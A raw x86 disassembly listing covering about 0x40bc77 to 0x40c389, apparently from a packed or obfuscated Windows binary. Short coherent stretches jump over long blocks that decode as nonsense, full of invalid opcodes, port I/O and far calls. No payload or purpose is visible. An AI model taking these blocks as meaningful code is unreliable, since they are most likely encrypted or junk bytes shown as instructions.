  40bc77:	add    eax,ebx
  40bc79:	cmp    ecx,eax
  40bc7b:	jne    0x40bef1
  40bc81:	mov    eax,DWORD PTR [ebp-0x4]
  40bc84:	jmp    0x40bee7
  40bc89:	into   
  40bc8a:	mov    esp,0xb26ca26c
  40bc8f:	shl    BYTE PTR [eax+0x17],1
  40bc92:	stos   DWORD PTR es:[edi],eax
  40bc93:	mov    WORD PTR [eax],?
  40bc95:	imul   edx,esi,0xffffff8d
  40bc98:	adc    al,dh
  40bc9a:	sti    
  40bc9b:	jle    0x40bd1b
  40bc9d:	cmp    BYTE PTR [esi+edi*2+0x7e],bh
  40bca1:	xchg   ebp,eax
  40bca2:	stc    
  40bca3:	in     eax,dx
  40bca4:	or     edx,edi
  40bca6:	add    ah,al
  40bca8:	outs   dx,DWORD PTR ds:[esi]
  40bca9:	sahf   
  40bcaa:	jnp    0x40bce8
  40bcac:	mov    esi,0x91abbcbc
  40bcb1:	sub    eax,DWORD PTR [edx-0x49]
  40bcb4:	mov    WORD PTR [ecx],es
  40bcb6:	dec    ebp
  40bcb7:	mov    ebx,0xc52e892f
  40bcbc:	jge    0x40bd27
  40bcbe:	push   esi
  40bcbf:	pop    ebx
  40bcc0:	loopne 0x40bc4d
  40bcc2:	jp     0x40bcf0
  40bcc4:	mov    edi,0x4c3d962c
  40bcc9:	gs push ebp
  40bccb:	(bad)  
  40bccc:	in     eax,dx
  40bccd:	lods   eax,DWORD PTR ds:[esi]
  40bcce:	xchg   edx,eax
  40bccf:	sbb    BYTE PTR [eax-0x5a],0xd
  40bcd3:	xor    eax,0xf5533983
  40bcd8:	cmp    al,0xd8
  40bcda:	jae    0x40bd56
  40bcdc:	in     eax,dx
  40bcdd:	outs   dx,BYTE PTR ds:[esi]
  40bcde:	and    al,0x1e
  40bce0:	sub    BYTE PTR [esi+0x26],dh
  40bce3:	lods   al,BYTE PTR ds:[esi]
  40bce4:	sbb    eax,0x17105bf3
  40bce9:	jp     0x40bc6e
  40bceb:	lds    ebx,FWORD PTR [ebx]
  40bced:	and    al,0xa9
  40bcef:	lea    edi,ds:0x76579c4d
  40bcf5:	mov    edx,DWORD PTR [ecx]
  40bcf7:	jnp    0x40bcae
  40bcf9:	fst    DWORD PTR [eax]
  40bcfb:	jmp    0x418a5c74
  40bd00:	scas   eax,DWORD PTR es:[edi]
  40bd01:	mov    ds:0x1fa7604b,eax
  40bd06:	inc    ebx
  40bd07:	dec    ecx
  40bd08:	data16 and bl,BYTE PTR [ebx-0x2d]
  40bd0c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40bd0d:	xor    BYTE PTR [esi+0x27],0x64
  40bd11:	ffree  st(2)
  40bd13:	js     0x40bca5
  40bd15:	mov    bl,0x42
  40bd17:	xchg   ecx,eax
  40bd18:	cmp    al,0xcb
  40bd1a:	imul   ebp,eax,0xfd7d9bbb
  40bd20:	adc    dh,BYTE PTR [esi]
  40bd22:	stc    
  40bd23:	mov    ds:0x5db0d615,eax
  40bd28:	pop    es
  40bd29:	(bad)  
  40bd2a:	sti    
  40bd2b:	jbe    0x40bd7e
  40bd2d:	test   eax,0x966826d9
  40bd32:	mov    WORD PTR [ebx+0x5a],cs
  40bd35:	mov    bh,0x12
  40bd37:	es idiv bl
  40bd3a:	out    0x25,al
  40bd3c:	data16 dec BYTE PTR [eax-0x1e]
  40bd40:	push   ds
  40bd41:	push   edi
  40bd42:	cwde   
  40bd43:	lahf   
  40bd44:	sbb    bl,BYTE PTR [eax]
  40bd46:	retf   0x9055
  40bd49:	call   0x6b52:0x90330e4b
  40bd50:	out    dx,eax
  40bd51:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40bd52:	sbb    edx,edx
  40bd54:	lahf   
  40bd55:	lea    ebx,[edx-0xb]
  40bd58:	outs   dx,BYTE PTR ds:[esi]
  40bd59:	mov    eax,ds:0x7ec11d14
  40bd5e:	lahf   
  40bd5f:	push   esp
  40bd60:	or     ecx,DWORD PTR [eax]
  40bd62:	addr16 std 
  40bd64:	repz in al,0xe
  40bd67:	jecxz  0x40bd7f
  40bd69:	jecxz  0x40bd4a
  40bd6b:	or     al,0xf2
  40bd6d:	retf   0x6102
  40bd70:	jle    0x40bdb2
  40bd72:	mov    ah,cl
  40bd74:	les    edi,FWORD PTR [ebp-0x22]
  40bd77:	aas    
  40bd78:	js     0x40bd35
  40bd7a:	mov    ebx,DWORD PTR [edi-0xa]
  40bd7d:	dec    ecx
  40bd7e:	iret   
  40bd7f:	(bad)  
  40bd80:	in     eax,dx
  40bd81:	sub    dl,cl
  40bd83:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bd84:	jns    0x40bd6d
  40bd86:	add    al,al
  40bd88:	pop    ecx
  40bd89:	in     al,dx
  40bd8a:	stos   BYTE PTR es:[edi],al
  40bd8b:	push   ds
  40bd8c:	cmp    dh,BYTE PTR cs:[ecx-0x42f53978]
  40bd93:	sbb    ecx,0xffffff8a
  40bd96:	mov    esp,0xbd00c4e4
  40bd9b:	mov    al,ds:0x1154013c
  40bda0:	adc    BYTE PTR [esi+0x17],bl
  40bda3:	pop    esp
  40bda4:	gs xchg edx,eax
  40bda6:	fist   WORD PTR ds:[ebx-0x80]
  40bdaa:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40bdab:	neg    BYTE PTR [ecx+0x43a5cc23]
  40bdb1:	xchg   ebp,eax
  40bdb2:	push   esp
  40bdb3:	movq   mm1,QWORD PTR [ebp-0x18]
  40bdb7:	cmc    
  40bdb8:	pop    ds
  40bdb9:	cmp    BYTE PTR [ecx-0x31437ac4],al
  40bdbf:	ins    DWORD PTR es:[edi],dx
  40bdc0:	lods   eax,DWORD PTR ds:[esi]
  40bdc1:	pop    ecx
  40bdc2:	add    bh,ch
  40bdc4:	(bad)  
  40bdc5:	(bad)  
  40bdc6:	lds    ecx,FWORD PTR [edx+eax*2+0x79675659]
  40bdcd:	jbe    0x40bdd8
  40bdcf:	pop    edi
  40bdd0:	leave  
  40bdd1:	ins    BYTE PTR es:[edi],dx
  40bdd2:	mov    dl,0x9
  40bdd4:	adc    eax,0xad745ed2
  40bdd9:	dec    edx
  40bdda:	jnp    0x40bdc1
  40bddc:	xchg   edi,eax
  40bddd:	cmp    ecx,DWORD PTR [eax+ebx*8+0x79fa0890]
  40bde4:	es pusha 
  40bde6:	lods   al,BYTE PTR ds:[esi]
  40bde7:	pop    edx
  40bde8:	inc    ecx
  40bde9:	arpl   bp,bx
  40bdeb:	xor    edi,DWORD PTR [eax+0x319b9fc0]
  40bdf1:	hlt    
  40bdf2:	in     al,0xfe
  40bdf4:	ret    0xcecc
  40bdf7:	push   ebp
  40bdf8:	and    BYTE PTR [ecx],0x55
  40bdfb:	sub    DWORD PTR ds:0x971a2177,eax
  40be01:	mov    esp,DWORD PTR [edx]
  40be03:	pop    ebp
  40be04:	adc    bh,bh
  40be06:	pop    edx
  40be07:	push   0x433eaeff
  40be0c:	aad    0xaf
  40be0e:	xchg   edi,eax
  40be0f:	hlt    
  40be10:	fs jae 0x40bdf0
  40be13:	mov    ah,0x46
  40be15:	dec    edi
  40be16:	loope  0x40be08
  40be18:	repnz xlat BYTE PTR ds:[ebx]
  40be1a:	mov    ds:0x7a6014c9,eax
  40be1f:	mov    ebp,0x59a92968
  40be24:	ss cmp al,0x78
  40be27:	mov    eax,0xad854958
  40be2c:	dec    eax
  40be2d:	inc    esi
  40be2e:	mov    eax,DWORD PTR [edi+0x11e5a74f]
  40be34:	xor    esi,DWORD PTR [ebx-0x43]
  40be37:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40be38:	dec    ecx
  40be39:	ret    0xf584
  40be3c:	xor    ah,BYTE PTR [eax-0x6b]
  40be3f:	or     DWORD PTR [ebp+0x7d],ecx
  40be42:	add    eax,0xa31eeb60
  40be47:	mov    ebx,0x34ec5f11
  40be4c:	repnz sbb esp,DWORD PTR [ebp+0x4fbbfcfd]
  40be53:	outs   dx,BYTE PTR ds:[esi]
  40be54:	push   ebx
  40be55:	addr16 cmp eax,0xd155e31d
  40be5b:	stos   DWORD PTR es:[edi],eax
  40be5c:	jne    0x40be67
  40be5e:	inc    esp
  40be5f:	jp     0x40be63
  40be61:	fist   DWORD PTR [esi+ebx*4+0x6deeda3]
  40be68:	mov    BYTE PTR ds:0x49b9,bl
  40be6d:	(bad)  
  40be6e:	adc    BYTE PTR [esi-0x254fdceb],ch
  40be74:	sbb    DWORD PTR [esi-0x50807b47],0x6c
  40be7b:	jnp    0x40be23
  40be7d:	jmp    0x40becb
  40be7f:	inc    esp
  40be80:	and    dh,bh
  40be82:	jnp    0x40be0d
  40be84:	(bad)  
  40be85:	scas   eax,DWORD PTR es:[edi]
  40be86:	jno    0x40bf01
  40be88:	jecxz  0x40be19
  40be8a:	push   ebx
  40be8b:	or     BYTE PTR [ecx],0xb8
  40be8e:	rol    DWORD PTR [ecx],1
  40be90:	sbb    eax,0xa2b37cf0
  40be96:	lods   eax,DWORD PTR ds:[esi]
  40be97:	pop    ebx
  40be98:	dec    eax
  40be99:	push   esi
  40be9a:	retf   0xcc1b
  40be9d:	fimul  WORD PTR [ebp+0x4af5e9a8]
  40bea3:	out    0x82,eax
  40bea5:	mov    bl,0x31
  40bea7:	je     0x40be71
  40bea9:	xchg   edi,eax
  40beaa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40beab:	dec    edx
  40beac:	adc    DWORD PTR [ebx+0x17],esi
  40beaf:	mov    edx,DWORD PTR [ebp+edi*8+0x1a]
  40beb3:	push   esi
  40beb4:	mov    al,0xc8
  40beb6:	mov    dh,0x1a
  40beb8:	jnp    0x40bec3
  40beba:	popa   
  40bebb:	inc    esi
  40bebc:	sub    DWORD PTR ds:0xd2159390,ebp
  40bec2:	xchg   ecx,eax
  40bec3:	(bad)  
  40bec4:	xor    al,0x4d
  40bec6:	pop    esp
  40bec7:	and    DWORD PTR [esi],0x65553d60
  40becd:	add    ch,bl
  40becf:	mov    ch,0x5
  40bed1:	sbb    eax,0x48a65752
  40bed6:	dec    edx
  40bed7:	repz fadd QWORD PTR [ecx-0x58]
  40bedb:	repz sti 
  40bedd:	dec    esp
  40bede:	hlt    
  40bedf:	adc    DWORD PTR [edx],0xffffffb8
  40bee2:	or     ah,BYTE PTR [eax+0x35fde58a]
  40bee8:	push   esp
  40bee9:	or     BYTE PTR [ecx+0x7],dl
  40beec:	jmp    0x40b9f2
  40bef1:	mov    eax,DWORD PTR [ebp+0xc]
  40bef4:	add    eax,DWORD PTR [ebp+0x8]
  40bef7:	mov    DWORD PTR [ebp-0x10],eax
  40befa:	mov    eax,DWORD PTR [ebp-0x1c]
  40befd:	test   eax,eax
  40beff:	je     0x40cbbe
  40bf05:	mov    DWORD PTR [ebp-0x24],esi
  40bf08:	push   0xb
  40bf0a:	pop    ecx
  40bf0b:	push   0x5
  40bf0d:	dec    ecx
  40bf0e:	pop    ebx
  40bf0f:	xchg   ebx,ecx
  40bf11:	sub    ebx,ecx
  40bf13:	jmp    0x40c176
  40bf18:	pop    ecx
  40bf19:	jbe    0x69f82f56
  40bf1f:	push   ecx
  40bf20:	scas   eax,DWORD PTR es:[edi]
  40bf21:	or     cl,BYTE PTR [esi-0x2b9788cf]
  40bf27:	mov    eax,0x7e7ef980
  40bf2c:	cmp    BYTE PTR [esi+edi*2+0x7e],bh
  40bf30:	adc    eax,DWORD PTR [esi]
  40bf32:	rep movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40bf34:	xor    eax,0x9f9dae76
  40bf39:	mov    eax,ds:0xfbd9d5fc
  40bf3e:	repnz mov bh,0x56
  40bf41:	dec    ecx
  40bf42:	dec    edi
  40bf43:	jle    0x40bf99
  40bf45:	fsubr  st(3),st
  40bf47:	(bad)  
  40bf48:	retf   0x82d5
  40bf4b:	xchg   DWORD PTR [ebp+0xbb12e91],esp
  40bf51:	mov    dl,0x49
  40bf53:	xor    al,0x85
  40bf55:	pop    esp
  40bf56:	fbstp  TBYTE PTR [edi+0x72]
  40bf59:	scas   eax,DWORD PTR es:[edi]
  40bf5a:	inc    ebx
  40bf5b:	dec    edx
  40bf5c:	cmp    BYTE PTR [ecx],bh
  40bf5e:	mov    edi,eax
  40bf60:	add    ah,BYTE PTR [esi+0x7f]
  40bf63:	xor    eax,0xee494fa3
  40bf68:	daa    
  40bf69:	fmul   QWORD PTR [ebx-0x1e9e2dd0]
  40bf6f:	pop    esp
  40bf70:	dec    eax
  40bf71:	xor    edx,DWORD PTR [ecx+0x2e4af0ca]
  40bf77:	cmp    edx,esp
  40bf79:	pop    ebp
  40bf7a:	(bad)  
  40bf7b:	lea    ebp,[ebx]
  40bf7d:	push   0x63
  40bf7f:	dec    ebx
  40bf80:	xchg   esi,eax
  40bf81:	or     al,0x92
  40bf83:	ror    bl,1
  40bf85:	outs   dx,BYTE PTR ds:[esi]
  40bf86:	imul   esp,DWORD PTR [ebx+0xd],0xffffffde
  40bf8a:	sub    DWORD PTR [ebx-0x652ff6a5],0x47
  40bf91:	or     eax,0x405b6844
  40bf96:	sub    al,0x56
  40bf98:	adc    edi,DWORD PTR [esi]
  40bf9a:	shl    DWORD PTR [eax+0x67],cl
  40bf9d:	je     0x40c014
  40bf9f:	push   edi
  40bfa0:	lahf   
  40bfa1:	cli    
  40bfa2:	lods   eax,DWORD PTR ds:[esi]
  40bfa3:	or     eax,0x58771cf
  40bfa8:	mov    dl,0xa9
  40bfaa:	(bad)  
  40bfab:	ffreep st(6)
  40bfad:	(bad)  
  40bfae:	aad    0x32
  40bfb0:	stc    
  40bfb1:	scas   al,BYTE PTR es:[edi]
  40bfb2:	dec    BYTE PTR [edx-0x3b]
  40bfb5:	inc    edx
  40bfb6:	pop    eax
  40bfb7:	mov    eax,0xd24eea43
  40bfbc:	imul   esi,eax,0x1b
  40bfbf:	cmp    DWORD PTR [ecx-0x58],esp
  40bfc2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40bfc3:	adc    esp,edx
  40bfc5:	xchg   ebx,eax
  40bfc6:	push   ecx
  40bfc7:	and    edi,DWORD PTR [ebx+0x56]
  40bfca:	inc    ecx
  40bfcb:	fwait
  40bfcc:	xchg   edx,eax
  40bfcd:	js     0x40bf94
  40bfcf:	push   cs
  40bfd0:	jno    0x40bff2
  40bfd2:	adc    BYTE PTR [ebp-0x7f],ch
  40bfd5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40bfd6:	lods   al,BYTE PTR ds:[esi]
  40bfd7:	and    esp,DWORD PTR [ebx]
  40bfd9:	cdq    
  40bfda:	pop    ebx
  40bfdb:	push   ebp
  40bfdc:	push   edi
  40bfdd:	call   0xd57e:0x76fed625
  40bfe4:	add    ecx,ebx
  40bfe6:	dec    ecx
  40bfe7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40bfe8:	addr16 jl 0x40c03a
  40bfeb:	pusha  
  40bfec:	add    al,0x4a
  40bfee:	cs or  al,0x7f
  40bff1:	and    al,0xc6
  40bff3:	xchg   esi,eax
  40bff4:	leave  
  40bff5:	pop    eax
  40bff6:	push   ds
  40bff7:	mov    DWORD PTR [edx+0x36],ebp
  40bffa:	sbb    eax,0x7359457b
  40bfff:	xor    eax,0xec472aa6
  40c004:	push   ss
  40c005:	or     dl,BYTE PTR [esi+0x3a505967]
  40c00b:	repz xor eax,0x1486db0d
  40c011:	fmul   QWORD PTR [esi-0x5c]
  40c014:	imul   eax,esp,0x74
  40c017:	pop    es
  40c018:	into   
  40c019:	and    cl,dh
  40c01b:	pop    esp
  40c01c:	dec    edi
  40c01d:	pop    es
  40c01e:	pop    ecx
  40c01f:	cmc    
  40c020:	pop    ds
  40c021:	jge    0x40c000
  40c023:	mov    ds:0x35f229c3,al
  40c028:	jne    0x40c078
  40c02a:	mov    esi,0xfa4a1f3b
  40c02f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c030:	xor    edi,DWORD PTR [esi-0x24]
  40c033:	retf   0xdf0a
  40c036:	pop    esi
  40c037:	lock xor ebx,ecx
  40c03a:	and    BYTE PTR [esi*2-0x33f7caa4],cl
  40c041:	mov    esi,0x71dff131
  40c046:	and    eax,0x90970f87
  40c04b:	dec    esp
  40c04c:	jmp    0x9343:0xc256a2c8
  40c053:	mov    ch,0x10
  40c055:	dec    edx
  40c056:	retf   0x9beb
  40c059:	(bad)  
  40c05a:	sbb    eax,0xdbe2806b
  40c05f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c060:	sub    dl,al
  40c062:	sahf   
  40c063:	shl    BYTE PTR [edx+0x14],0x1
  40c067:	mov    ah,BYTE PTR [edx-0x30]
  40c06a:	neg    eax
  40c06c:	and    al,0xf8
  40c06e:	mov    al,ds:0xa206ba04
  40c073:	in     al,0x17
  40c075:	adc    dh,BYTE PTR [esi+0x4740f135]
  40c07b:	bound  edi,QWORD PTR [esi+0x30a1aeea]
  40c081:	mov    ebx,DWORD PTR [edi]
  40c083:	test   BYTE PTR [eax+0x43],al
  40c086:	xchg   ecx,eax
  40c087:	aas    
  40c088:	retf   
  40c089:	mov    ebx,0x79df9c69
  40c08e:	jg     0x40c05b
  40c090:	or     al,0x27
  40c092:	sub    BYTE PTR [ebx-0x1b],bh
  40c095:	mov    cr0,ebp
  40c098:	sbb    bl,bh
  40c09a:	xchg   ebx,eax
  40c09b:	aas    
  40c09c:	lods   al,BYTE PTR ds:[esi]
  40c09d:	inc    edx
  40c09e:	dec    edi
  40c09f:	sahf   
  40c0a0:	push   0xcec153b
  40c0a5:	pop    esi
  40c0a6:	add    edx,DWORD PTR [ebp+edi*8-0x1c]
  40c0aa:	and    BYTE PTR [edx-0x3e],dh
  40c0ad:	scas   al,BYTE PTR es:[edi]
  40c0ae:	mov    edi,edx
  40c0b0:	xchg   esp,eax
  40c0b1:	mov    ebx,DWORD PTR [esi+0x1f530478]
  40c0b7:	adc    DWORD PTR [edi],edx
  40c0b9:	addr16 xchg ebp,eax
  40c0bb:	push   edx
  40c0bc:	add    BYTE PTR [ecx-0x2e2cef77],0x65
  40c0c3:	jmp    DWORD PTR [eiz*4-0x670792be]
  40c0ca:	fs jo  0x40c0f7
  40c0cd:	jb     0x40c0c9
  40c0cf:	in     al,dx
  40c0d0:	iret   
  40c0d1:	sub    BYTE PTR [edx+eax*8+0x6caa620c],dl
  40c0d8:	rol    DWORD PTR [eax],cl
  40c0da:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c0db:	xchg   ecx,eax
  40c0dc:	rcr    WORD PTR [ecx+0xe],0x8f
  40c0e1:	or     BYTE PTR [edx+0x27],bl
  40c0e4:	jb     0x40c121
  40c0e6:	repnz pop ds
  40c0e8:	scas   al,BYTE PTR es:[edi]
  40c0e9:	sahf   
  40c0ea:	jecxz  0x40c14a
  40c0ec:	stos   DWORD PTR es:[edi],eax
  40c0ed:	ret    
  40c0ee:	inc    eax
  40c0ef:	(bad)  
  40c0f0:	das    
  40c0f1:	retf   0x37bd
  40c0f4:	xor    al,0x2d
  40c0f6:	pop    esp
  40c0f7:	mov    al,0x3e
  40c0f9:	aas    
  40c0fa:	aam    0x1b
  40c0fc:	push   esi
  40c0fd:	push   edi
  40c0fe:	add    al,BYTE PTR [edi+0x69848cfd]
  40c104:	xchg   ecx,eax
  40c105:	std    
  40c106:	sbb    DWORD PTR ds:0x54d0c714,edi
  40c10c:	jp     0x40c105
  40c10e:	ins    BYTE PTR es:[edi],dx
  40c10f:	add    BYTE PTR [edi+0x4e92837c],bl
  40c115:	cwde   
  40c116:	pop    ebx
  40c117:	push   0xd6c00d8
  40c11c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c11d:	mov    al,0x8a
  40c11f:	jnp    0x40c17e
  40c121:	xchg   ecx,eax
  40c122:	jae    0x40c122
  40c124:	fsubr  st(2),st
  40c126:	sbb    dh,BYTE PTR [eax]
  40c128:	out    0xf0,al
  40c12a:	jno    0x40c0c2
  40c12c:	dec    edi
  40c12d:	das    
  40c12e:	dec    esp
  40c12f:	call   0x4e4f5615
  40c134:	out    dx,eax
  40c135:	(bad)  
  40c136:	int    0x8f
  40c138:	cmp    al,0x60
  40c13a:	ins    BYTE PTR es:[edi],dx
  40c13b:	mov    dh,0x87
  40c13d:	lods   eax,DWORD PTR ds:[esi]
  40c13e:	mov    ah,0xeb
  40c140:	dec    edx
  40c141:	and    al,0x52
  40c143:	sub    eax,0x69b72aa3
  40c148:	jne    0x40c0d7
  40c14a:	daa    
  40c14b:	pop    esi
  40c14c:	mul    BYTE PTR [ebx]
  40c14e:	jns    0x40c13d
  40c150:	mov    ebp,0xbe447d67
  40c155:	push   edi
  40c156:	push   ebx
  40c157:	pop    esi
  40c158:	ins    DWORD PTR es:[edi],dx
  40c159:	or     eax,0x30273912
  40c15e:	(bad)  
  40c15f:	frstor [edi+ebx*4]
  40c162:	dec    ecx
  40c163:	dec    ebp
  40c164:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c165:	loope  0x40c18b
  40c167:	inc    esp
  40c168:	cdq    
  40c169:	push   es
  40c16a:	inc    eax
  40c16b:	imul   ebp,ebp,0x10edf46b
  40c171:	jnp    0x40c199
  40c173:	push   esp
  40c174:	push   esi
  40c175:	xor    eax,0x8b49cb87
  40c17a:	inc    ebp
  40c17b:	in     al,0xf
  40c17d:	scas   eax,DWORD PTR es:[edi]
  40c17e:	shr    DWORD PTR [ebx],0xe0
  40c181:	mov    DWORD PTR [ebp-0x24],esp
  40c184:	jmp    0x40c3e7
  40c189:	dec    ebx
  40c18a:	loop   0x40c1d9
  40c18c:	lds    esi,FWORD PTR [ebp+0x71]
  40c18f:	push   ebx
  40c190:	jo     0x40c117
  40c192:	mov    cl,0xee
  40c194:	sub    al,0xfe
  40c196:	pop    ebp
  40c197:	inc    ebp
  40c198:	dec    BYTE PTR [edx-0x79]
  40c19b:	jle    0x40c21b
  40c19d:	cmp    BYTE PTR [esi+edi*2+0x7e],bh
  40c1a1:	fcom   QWORD PTR [ebp+0x6b]
  40c1a4:	mov    ds:0x5605a2f4,al
  40c1a9:	cwde   
  40c1aa:	inc    eax
  40c1ab:	mov    edx,0xb296972f
  40c1b0:	je     0x40c15f
  40c1b2:	fdivr  st(5),st
  40c1b4:	mov    ds:0x54dbd736,al
  40c1b9:	das    
  40c1ba:	cmp    cl,BYTE PTR [edx]
  40c1bc:	imul   esp,DWORD PTR [edi],0x2c
  40c1bf:	add    eax,0xb1e6c2e0
  40c1c4:	out    0x11,al
  40c1c6:	shr    DWORD PTR [edi-0x3d2e3a6a],0x85
  40c1cd:	scas   eax,DWORD PTR es:[edi]
  40c1ce:	pop    sp
  40c1d0:	std    
  40c1d1:	ins    DWORD PTR es:[edi],dx
  40c1d2:	xlat   BYTE PTR ds:[ebx]
  40c1d3:	ret    0xbf3f
  40c1d6:	(bad)  
  40c1d7:	jne    0x40c1ec
  40c1d9:	mov    dh,0xb1
  40c1db:	loopne 0x40c1fa
  40c1dd:	sbb    BYTE PTR [edi+eax*8-0x14],dl
  40c1e1:	mov    esi,0xb616f53f
  40c1e6:	inc    edi
  40c1e7:	sbb    eax,ecx
  40c1e9:	bound  ebp,QWORD PTR [eax]
  40c1eb:	add    bl,BYTE PTR [edi-0x4de93b8]
  40c1f1:	jnp    0x40c19f
  40c1f3:	scas   al,BYTE PTR es:[edi]
  40c1f4:	mov    cs,ebp
  40c1f6:	in     eax,dx
  40c1f7:	jb     0x40c272
  40c1f9:	jmp    0xa83769d8
  40c1fe:	push   ebp
  40c1ff:	retf   
  40c200:	fistp  WORD PTR [eax]
  40c202:	xor    edi,0xfdf49c48
  40c208:	cmp    DWORD PTR [edi+0x151bcfe4],eax
  40c20e:	aas    
  40c20f:	(bad)  
  40c211:	(bad)  [ecx+0x4d81d085]
  40c217:	repz sbb BYTE PTR [eax-0x22],ah
  40c21b:	in     al,0x8b
  40c21d:	lods   eax,DWORD PTR ds:[esi]
  40c21e:	mov    ebx,0x44f92150
  40c223:	fimul  WORD PTR [ecx+0x74]
  40c226:	sub    DWORD PTR [ecx+eax*2-0x25],edx
  40c22a:	mov    al,ds:0xfdb76c1c
  40c22f:	je     0x40c24c
  40c231:	xchg   ebp,eax
  40c232:	ins    DWORD PTR es:[edi],dx
  40c233:	cld    
  40c234:	inc    esp
  40c235:	(bad)  
  40c236:	je     0x40c225
  40c238:	pop    edx
  40c239:	xchg   edx,eax
  40c23a:	icebp  
  40c23b:	jns    0x40c250
  40c23d:	out    0xff,eax
  40c23f:	jo     0x40c1fc
  40c241:	inc    ebp
  40c242:	out    dx,al
  40c243:	mov    ebx,0x52a434fa
  40c248:	popa   
  40c249:	addr16 jge 0x40c2c7
  40c24c:	xor    al,0xb
  40c24e:	pop    es
  40c24f:	cmp    bl,BYTE PTR [esi]
  40c251:	sbb    ch,BYTE PTR [ebp-0x2e1a21a]
  40c257:	fsub   st,st(7)
  40c259:	push   edi
  40c25a:	imul   eax,DWORD PTR [ecx+0x660eea1],0x34686bbb
  40c264:	test   al,0xfa
  40c266:	outs   dx,BYTE PTR ds:[esi]
  40c267:	sub    al,0xac
  40c269:	dec    edi
  40c26a:	mov    al,ah
  40c26c:	out    0xe6,al
  40c26e:	sbb    BYTE PTR [ebx+0x16],bl
  40c271:	sbb    esi,edi
  40c273:	jl     0x40c25b
  40c275:	(bad)
  40c278:	cwde   
  40c279:	dec    edx
  40c27a:	fs adc eax,0x75734ff2
  40c280:	stc    
  40c281:	adc    edi,DWORD PTR [edi*1+0x7ed39613]
  40c288:	cmovb  edx,DWORD PTR [edi+0x77]
  40c28c:	xchg   edx,eax
  40c28d:	mov    edx,0xda9ab61b
  40c292:	jb     0x40c273
  40c294:	and    al,0x58
  40c296:	xchg   ebx,eax
  40c297:	cmp    dh,cl
  40c299:	std    
  40c29a:	or     al,0x59
  40c29c:	mov    WORD PTR [ebx+0x49],ds
  40c29f:	mov    ah,0xcd
  40c2a1:	icebp  
  40c2a2:	inc    edi
  40c2a3:	xor    BYTE PTR [edx-0x64c84754],bl
  40c2a9:	iret   
  40c2aa:	clc    
  40c2ab:	repnz dec ebp
  40c2ad:	jg     0x40c326
  40c2af:	ss push ebx
  40c2b1:	imul   ecx,ebx,0x7b
  40c2b4:	or     DWORD PTR [eax+0x3c],edx
  40c2b7:	pushf  
  40c2b8:	les    ecx,FWORD PTR [ecx+ebp*1]
  40c2bb:	pusha  
  40c2bc:	out    dx,eax
  40c2bd:	mov    bh,0xb6
  40c2bf:	sub    al,0xdb
  40c2c1:	jnp    0x40c31c
  40c2c3:	inc    ebp
  40c2c4:	pop    esi
  40c2c5:	scas   al,BYTE PTR es:[edi]
  40c2c6:	into   
  40c2c7:	mov    cl,0x47
  40c2c9:	ficom  DWORD PTR [ebp+0x36]
  40c2cc:	push   ds
  40c2cd:	jg     0x40c26a
  40c2cf:	jg     0x40c2e6
  40c2d1:	and    al,0xd1
  40c2d3:	pop    edx
  40c2d4:	mov    eax,0x37d135e7
  40c2d9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c2da:	inc    edi
  40c2db:	jmp    0x40c313
  40c2dd:	sbb    BYTE PTR [ecx+0x31],bh
  40c2e0:	dec    esp
  40c2e1:	inc    ebx
  40c2e2:	repnz ins BYTE PTR es:[edi],dx
  40c2e4:	gs (bad) 
  40c2e6:	(bad)  
  40c2e7:	out    0x6,eax
  40c2e9:	pop    edx
  40c2ea:	mov    al,ds:0xe44289f7
  40c2ef:	jecxz  0x40c295
  40c2f1:	xlat   BYTE PTR ds:[ebx]
  40c2f2:	push   0x92f22b3
  40c2f7:	sub    eax,0xf44877b7
  40c2fc:	enter  0x61ec,0xe0
  40c300:	aad    0x34
  40c302:	or     al,0x1b
  40c304:	fs mov ebp,0x604191ee
  40c30a:	xchg   ecx,eax
  40c30b:	test   ebx,edx
  40c30d:	ds mov esi,0x2a9e0dfd
  40c313:	clc    
  40c314:	(bad)  
  40c315:	shl    DWORD PTR [ebx-0x7a004fd8],cl
  40c31b:	lea    esp,ds:0x34782dc4
  40c321:	jbe    0x40c2ab
  40c323:	out    0x7,al
  40c325:	xchg   ecx,eax
  40c326:	dec    esi
  40c327:	sub    bh,bh
  40c329:	mov    bl,dh
  40c32b:	std    
  40c32c:	dec    ebp
  40c32d:	add    cl,BYTE PTR [ecx+0x404275ea]
  40c333:	fidivr DWORD PTR [esi+eiz*4-0x66bc7101]
  40c33a:	mov    cl,0xa7
  40c33c:	xor    eax,0x5ddaeb11
  40c341:	out    dx,al
  40c342:	popa   
  40c343:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c344:	xlat   BYTE PTR ds:[ebx]
  40c345:	or     al,0x75
  40c347:	ins    BYTE PTR es:[edi],dx
  40c348:	push   ds
  40c349:	or     esp,esi
  40c34b:	sahf   
  40c34c:	or     DWORD PTR [edi-0x5f],ebx
  40c34f:	out    0x2b,al
  40c351:	adc    al,0xc8
  40c353:	adc    eax,0xe579e5d2
  40c358:	jo     0x40c315
  40c35a:	mov    ecx,0x65ef25fa
  40c35f:	xchg   ebp,eax
  40c360:	pop    ds
  40c361:	imul   edi,DWORD PTR [edx-0x6f3b032d],0xd4b7405f
  40c36b:	rcr    BYTE PTR [ebp-0x6d2936ac],0xbc
  40c372:	test   eax,0xb427051e
  40c377:	and    DWORD PTR [eax],eax
  40c379:	dec    eax
  40c37a:	ja     0x40c349
  40c37c:	mov    eax,ds:0x740f9ef9
  40c381:	in     al,0x72
  40c383:	shl    DWORD PTR [esi-0x21],1
  40c386:	xor    DWORD PTR [esi-0x63],eax
  40c389:	mov    eax,ds:0xc5ac8e8c
